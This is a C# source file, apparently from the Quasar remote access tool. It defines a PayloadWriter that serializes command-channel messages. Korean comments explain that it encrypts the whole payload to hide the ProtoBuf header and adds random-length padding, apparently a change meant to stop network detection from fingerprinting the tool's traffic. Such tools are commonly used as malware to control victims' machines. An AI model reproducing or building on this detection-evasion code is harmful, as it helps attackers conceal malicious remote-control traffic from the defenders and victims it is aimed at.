using ProtoBuf;
using Quasar.Common.Cryptography;
using Quasar.Common.Messages;
using System;
using System.IO;

namespace Quasar.Common.Networking
{
    public class PayloadWriter : MemoryStream
    {
        private readonly Stream _innerStream;
        private readonly Aes256 _aes;
        public bool LeaveInnerStreamOpen { get; }

        public PayloadWriter(Stream stream, bool leaveInnerStreamOpen, string encryptionKey)
        {
            _innerStream = stream;
            LeaveInnerStreamOpen = leaveInnerStreamOpen;
            _aes = new Aes256(encryptionKey); // 키로 초기화
        }

        public void WriteBytes(byte[] value)
        {
            _innerStream.Write(value, 0, value.Length);
        }

        public void WriteInteger(int value)
        {
            WriteBytes(BitConverter.GetBytes(value));
        }

        /// <summary>
        /// Writes a serialized message as payload to the stream.
        /// </summary>
        /// <param name="message">The message to write.</param>
        /// <returns>The amount of written bytes to the stream.</returns>
        public int WriteMessage(IMessage message)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                Serializer.Serialize(ms, message);
                byte[] rawPayload = ms.ToArray();

                // [핵심] ProtoBuf 헤더를 숨기기 위해 전체 페이로드 암호화
                // 이 과정을 거치면 rawPayload.Length + 48바이트(HMAC+IV)가 됩니다.
                byte[] encryptedPayload = _aes.Encrypt(rawPayload);

                Random rnd = new Random();
                int paddingSize = rnd.Next(1, 129);
                byte[] padding = new byte[paddingSize];
                rnd.NextBytes(padding);

                // 전체 본문 길이 업데이트 (암호화된 본문 기준)
                int totalBodyLength = 1 + paddingSize + encryptedPayload.Length;

                WriteInteger(totalBodyLength); // 하부 엔진 헤더

                _innerStream.WriteByte((byte)paddingSize);
                _innerStream.Write(padding, 0, padding.Length);
                _innerStream.Write(encryptedPayload, 0, encryptedPayload.Length); // 암호화된 데이터 기록

                return 4 + totalBodyLength;
            }
        }

        protected override void Dispose(bool disposing)
        {
            try
            {
                if (LeaveInnerStreamOpen)
                {
                    _innerStream.Flush();
                }
                else
                {
                    _innerStream.Close();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }
    }
}
